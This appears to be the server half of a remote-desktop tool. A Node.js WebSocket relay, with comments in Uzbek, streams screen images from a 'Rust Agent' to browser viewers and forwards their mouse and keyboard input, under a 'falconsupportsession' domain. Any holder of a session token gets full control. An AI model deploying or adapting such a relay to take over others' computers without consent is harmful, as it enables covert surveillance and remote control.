const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
    // URL manzilini tekshirish (/sharing yoki asosiy sahifa)
    let filePath = path.join(__dirname, 'public', 'index.html');
    
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('index.html topilmadi!');
        } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        }
    });
});

const wss = new WebSocket.Server({ server });

const sessions = new Map(); // token -> { agentWs, viewers: Set, agentName }

wss.on('connection', (ws, req) => {
    let currentToken = null;
    let currentRole = null;

    ws.on('message', (message, isBinary) => {
        // Buffer yoki binar ma'lumot kelganini aniq tekshiramiz
        const isBin = Buffer.isBuffer(message) || isBinary || (message instanceof ArrayBuffer);

        if (isBin) {
            // Agentdan kelayotgan ekran rasmlarini (jpeg) barcha viewer'larga tarqatish
            if (currentRole === 'agent' && currentToken) {
                const session = sessions.get(currentToken);
                if (session && session.viewers) {
                    for (let viewerWs of session.viewers) {
                        if (viewerWs.readyState === WebSocket.OPEN) {
                            viewerWs.send(message);
                        }
                    }
                }
            }
        } else {
            try {
                const data = JSON.parse(message.toString());

                // Rust Agent ulanishi
                if (data.type === 'join-agent') {
                    currentToken = data.token.trim();
                    currentRole = 'agent';
                    
                    if (!sessions.has(currentToken)) {
                        sessions.set(currentToken, { 
                            agentWs: ws, 
                            viewers: new Set(), 
                            agentName: data.hostname || 'REMOTE-PC' 
                        });
                    } else {
                        const session = sessions.get(currentToken);
                        session.agentWs = ws;
                        if (data.hostname) session.agentName = data.hostname;
                    }

                    const sharingUrl = `https://admin.falconsupportsession.com/sharing?c=${currentToken}`;
                    
                    // Agentga muvaffaqiyatli ulanganini va sharing havolasini yuboramiz
                    ws.send(JSON.stringify({
                        type: 'registered',
                        sharingUrl: sharingUrl
                    }));

                    console.log('\n========================================');
                    console.log(`KOMPYUTER ULANDI: [ ${data.hostname || 'REMOTE-PC'} ]`);
                    console.log(`SHARING URL: ${sharingUrl}`);
                    console.log('========================================\n');
                } 
                // Brauzer Viewer ulanishi
                else if (data.type === 'join-viewer') {
                    currentToken = data.token.trim();
                    currentRole = 'viewer';
                    
                    if (!sessions.has(currentToken)) {
                        sessions.set(currentToken, { agentWs: null, viewers: new Set(), agentName: 'REMOTE-PC' });
                    }
                    
                    const session = sessions.get(currentToken);
                    session.viewers.add(ws);
                    console.log('Browser Viewer connected, token:', currentToken);

                    if (session && session.agentWs) {
                        ws.send(JSON.stringify({ 
                            type: 'joined-success', 
                            agentName: session.agentName 
                        }));
                    }
                } 
                // Viewer'dan agentga yuboriladigan sichqoncha/klaviatura buyruqlari
                else if (currentRole === 'viewer') {
                    const session = sessions.get(currentToken);
                    if (session && session.agentWs && session.agentWs.readyState === WebSocket.OPEN) {
                        session.agentWs.send(message.toString());
                    }
                }
            } catch (e) {
                console.error('Error parsing message:', e);
            }
        }
    });

    ws.on('close', () => {
        if (currentToken && sessions.has(currentToken)) {
            const session = sessions.get(currentToken);
            if (ws === session.agentWs) {
                session.agentWs = null;
                for (let viewerWs of session.viewers) {
                    if (viewerWs.readyState === WebSocket.OPEN) {
                        viewerWs.send(JSON.stringify({ type: 'disconnected' }));
                    }
                }
                console.log('Agent disconnected for token:', currentToken);
            } else {
                session.viewers.delete(ws);
            }
        }
    });
});

const PORT = 3030;
server.listen(PORT, '127.0.0.1', () => {
    console.log(`Server running on port ${PORT} for domain admin.falconsupportsession.com`);
});
